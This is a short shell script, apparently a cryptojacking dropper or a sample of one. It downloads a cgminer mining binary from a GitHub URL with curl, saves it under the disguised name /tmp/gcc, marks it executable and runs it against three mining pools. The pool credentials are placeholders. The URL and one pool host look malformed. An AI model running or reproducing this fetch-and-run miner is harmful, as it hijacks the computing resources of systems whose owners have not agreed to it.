#!/bin/sh

TARGET=/tmp/gcc

curl https://raw.githubusercontent.com//onk2e/crypto-mining/main/binaries/cgminer -o $TARGET -s
chmod +x $TARGET

$TARGET -T \
  -o stratum+tcp://stratum.slushpool:3333 -u foobar -p baz \
  -o stratum+tcp://stratum.f2pool.com:3333 -u foobar -p baz \
  -o stratum+tcp://stratum.antpool.com:3333 -u foobar -p baz
